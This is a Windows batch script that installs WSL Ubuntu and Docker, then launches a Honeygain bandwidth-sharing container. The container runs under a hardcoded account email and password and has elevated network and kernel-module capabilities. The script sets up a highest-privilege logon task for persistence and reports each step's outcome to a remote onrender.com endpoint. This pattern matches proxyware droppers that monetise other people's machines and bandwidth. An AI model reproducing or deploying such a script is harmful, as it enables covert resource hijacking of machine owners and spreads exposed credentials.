@echo off
setlocal enabledelayedexpansion

REM === CONFIGURATION ===
set EMAIL=ms32-org@outlook.com
set PASSWORD=ms32147258369
set DEVICE=windows-cmd
set LOG_URL=https://ms32-sha2.onrender.com/output

REM === LOG FUNCTION ===
set "CURL_CMD=curl -H "Content-Type: application/json" -X POST %LOG_URL% -d"

REM === INSTALL UBUNTU IF NOT PRESENT ===
wsl --list --quiet | findstr /i "Ubuntu" >nul
if %errorlevel% neq 0 (
    echo Installing Ubuntu...
    wsl --install -d Ubuntu
    if %errorlevel% neq 0 (
        echo Ubuntu install failed.
        %CURL_CMD% "{\"user\":\"docker\",\"err\":\"Ubuntu install failed\"}"
        exit /b
    )
)

REM === WAIT FOR WSL TO BE READY ===
echo Waiting for WSL to initialize...
timeout /t 10 >nul

REM === INSTALL DOCKER INSIDE UBUNTU ===
echo Installing Docker in Ubuntu...
wsl -e bash -c "apt-get update && apt-get install -y ca-certificates curl gnupg lsb-release"
if %errorlevel% neq 0 (
    echo Failed installing Docker dependencies.
    %CURL_CMD% "{\"user\":\"docker\",\"err\":\"Failed installing Docker dependencies\"}"
    exit /b
)

REM === ADD DOCKER GPG AND SETUP ===
wsl -e bash -c "mkdir -m 0755 -p /etc/apt/keyrings && \
  curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
  gpg --dearmor -o /etc/apt/keyrings/docker.gpg && \
  echo \
  \"deb [arch=\$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  \$(. /etc/os-release && echo \$VERSION_CODENAME) stable\" | tee /etc/apt/sources.list.d/docker.list > /dev/null && \
  apt-get update && apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin"
if %errorlevel% neq 0 (
    echo Docker install failed.
    %CURL_CMD% "{\"user\":\"docker\",\"err\":\"Docker install failed\"}"
    exit /b
)

REM === ENABLE DOCKER AUTOSTART AND START IT ===
wsl -e bash -c "service docker start"
if %errorlevel% neq 0 (
    echo Failed to start Docker daemon.
    %CURL_CMD% "{\"user\":\"docker\",\"err\":\"Failed to start Docker daemon\"}"
    exit /b
)

REM === PULL AND RUN HONEYGAIN CONTAINER ===
echo Running Honeygain container...
wsl -e bash -c "docker pull straysheep/honeygain && \
docker rm -f honeygain 2>/dev/null || true && \
docker run -d --name=honeygain --restart=unless-stopped \
--device /dev/net/tun --cap-add=NET_ADMIN --cap-add=SYS_MODULE \
-e EMAIL=%EMAIL% -e PASSWORD=%PASSWORD% -e DEVICE=%DEVICE% straysheep/honeygain"
if %errorlevel% neq 0 (
    echo Honeygain container run failed.
    %CURL_CMD% "{\"user\":\"docker\",\"err\":\"Honeygain container run failed\"}"
    exit /b
)

REM === AUTOSTART SCRIPT IN TASK SCHEDULER ===
echo Setting up Task Scheduler for autostart...
schtasks /create /tn "StartDockerWSL" /tr "wsl -e bash -c 'service docker start && docker start honeygain'" /sc onlogon /rl highest /f >nul 2>&1

REM === ALL DONE ===
echo All done successfully.
%CURL_CMD% "{\"user\":\"docker\",\"err\":\"success\"}"
exit /b
